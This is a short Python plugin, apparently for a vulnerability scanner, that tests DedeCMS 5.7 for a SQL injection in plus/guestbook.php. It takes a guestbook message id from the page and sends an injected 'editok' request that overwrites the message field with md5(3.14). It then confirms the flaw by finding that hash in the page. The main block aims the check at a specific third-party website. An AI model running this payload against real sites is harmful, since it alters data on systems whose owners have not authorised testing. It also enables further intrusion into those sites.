#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.shangxueba.com/jingyan/2190419.html
import re
def assign(service, arg): 
    if service == "dedecms": 
        return True, arg 
		
def audit(arg): 
    url = 'plus/guestbook.php'
    code, head, res, errcode, _ = curl.curl(arg + url)
    if code == 200:
        m = re.search(r'admin&id=(\d+)',res)
        if m:
            a = m.group(1)
            payload1 = 'plus/guestbook.php?action=admin&job=editok&id='
            payload2 = "&msg=%27,msg=md5(3.14),email=%27"
            payload = payload1 + a + payload2
            verify_url = arg + payload
            _, _, _, _, _ = curl.curl(verify_url)
            code, head, res, errcode, _ = curl.curl(arg+url)
            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
                security_hole('dedecms5.7 guestbook SQLinjection on %s' % url)
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('dedecms', 'http://www.jxsrmyy.cn/')[1])
	
